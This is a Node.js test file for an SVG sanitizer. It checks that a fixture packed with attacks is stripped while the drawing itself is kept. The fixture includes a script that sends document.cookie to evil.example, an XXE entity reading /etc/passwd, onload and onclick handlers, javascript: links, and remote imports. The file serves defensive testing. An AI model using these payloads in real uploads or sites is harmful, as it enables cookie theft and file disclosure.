const test = require('node:test');
const assert = require('node:assert');

const svg = require('../utils/svg');

// Everything an uploaded SVG might try, in one file
const HOSTILE = `<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="240" height="120" viewBox="0 0 240 120" onload="alert(1)">
  <script>fetch('https://evil.example/' + document.cookie)</script>
  <style>@import url(https://evil.example/x.css); .a { fill: url(https://evil.example/y.svg#f); } .b { fill: #3448c5 }</style>
  <defs><linearGradient id="g"><stop offset="0" stop-color="#3448c5"/><stop offset="1" stop-color="#34d399"/></linearGradient></defs>
  <rect class="b" width="240" height="120" rx="12" fill="url(#g)"/>
  <a xlink:href="javascript:alert(2)"><circle cx="60" cy="60" r="34" fill="#fff" onclick="alert(3)"/></a>
  <foreignObject width="100" height="50"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://evil.example"></iframe></body></foreignObject>
  <image xlink:href="https://evil.example/tracker.png" width="10" height="10"/>
  <use xlink:href="https://evil.example/remote.svg#icon"/>
  <text x="110" y="68" font-size="26" fill="#fff">Logo &amp; mark</text>
  <animate attributeName="href" to="javascript:alert(4)"/>
  <![CDATA[ <script>alert(5)</script> ]]>
</svg>`;

test('svg: nothing executable survives sanitizing', () => {
  const { svg: clean } = svg.sanitize(Buffer.from(HOSTILE));
  const text = clean.toString().toLowerCase();

  for (const attack of [
    'script',
    'onload',
    'onclick',
    'javascript:',
    'evil.example',
    'foreignobject',
    'iframe',
    'entity',
    'xxe',
    '@import',
    'cdata',
    'animate',
    'file://',
  ]) {
    assert.ok(!text.includes(attack), `"${attack}" survived sanitizing`);
  }
});

test('svg: the drawing itself survives', () => {
  const { svg: clean } = svg.sanitize(Buffer.from(HOSTILE));
  const text = clean.toString();

  for (const kept of [
    '<svg',
    'viewBox="0 0 240 120"',
    'linearGradient',
    'stop-color="#34d399"',
    '<rect',
    'url(#g)',
    '<circle',
    'Logo &amp; mark',
  ]) {
    assert.ok(text.includes(kept), `"${kept}" was lost`);
  }
  // <a> is a link, but what it wraps is ordinary drawing
  assert.ok(text.includes('<g>'), 'the anchor should become a group');
});

test('svg: reports what it removed', () => {
  const { removed } = svg.sanitize(Buffer.from(HOSTILE));
  assert.ok(removed.elements.includes('script'));
  assert.ok(removed.elements.includes('foreignobject'));
  assert.ok(removed.elements.includes('DOCTYPE'));
  assert.ok(removed.attributes.includes('onload'));
  assert.ok(removed.attributes.includes('xlink:href'));
});

test('svg: a clean file comes back unchanged in substance', () => {
  const source = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 4h16v16H4z" fill="#333"/></svg>';
  const { svg: clean, removed } = svg.sanitize(Buffer.from(source));
  assert.deepStrictEqual(removed, { elements: [], attributes: [] });
  assert.ok(clean.toString().includes('<path d="M4 4h16v16H4z" fill="#333"/>'));
});

test('svg: nested and repeated elements cannot smuggle anything through', () => {
  const nested = '<svg xmlns="http://www.w3.org/2000/svg"><g><script><script>alert(1)</script></script><rect width="5" height="5"/></g></svg>';
  const text = svg.sanitize(Buffer.from(nested)).svg.toString();
  assert.ok(!text.includes('alert'), text);
  assert.ok(text.includes('<rect'), 'the drawing after a nested script should survive');
});

test('svg: case is normalised, because XML is case sensitive', () => {
  const upper = '<SVG xmlns="http://www.w3.org/2000/svg" WIDTH="10" height="10" viewbox="0 0 10 10" OnLoad="x()"><RECT width="5" height="5"/></SVG>';
  const text = svg.sanitize(Buffer.from(upper)).svg.toString();
  assert.ok(text.includes('viewBox="0 0 10 10"'), 'viewBox has to keep its spelling');
  assert.ok(!text.toLowerCase().includes('onload'));
  assert.ok(text.includes('<rect'));
});

test('svg: only document anchors and data images may be referenced', () => {
  const refs =
    '<svg xmlns="http://www.w3.org/2000/svg">' +
    '<use href="#icon"/>' +
    '<use href="https://evil.example/x.svg#icon"/>' +
    '<image href="data:image/png;base64,iVBORw0KGgo="/>' +
    '<image href="data:text/html;base64,PHNjcmlwdD4="/>' +
    '</svg>';
  const text = svg.sanitize(Buffer.from(refs)).svg.toString();
  assert.ok(text.includes('href="#icon"'), 'a document anchor is fine');
  assert.ok(text.includes('data:image/png'), 'an inline image is fine');
  assert.ok(!text.includes('evil.example'));
  assert.ok(!text.includes('data:text/html'));
});

test('svg: recognises what is and is not a vector', () => {
  assert.ok(svg.looksLikeSvg(Buffer.from('<svg xmlns="x"/>')));
  assert.ok(svg.looksLikeSvg(Buffer.from('<?xml version="1.0"?>\n<svg xmlns="x"/>')));
  assert.ok(!svg.looksLikeSvg(Buffer.from('<html><body>hi</body></html>')));
  assert.ok(!svg.looksLikeSvg(Buffer.from([0x89, 0x50, 0x4e, 0x47, 1, 2, 3, 4])));
  assert.throws(() => svg.sanitize(Buffer.from('<html><script>alert(1)</script></html>')), svg.SvgError);
});
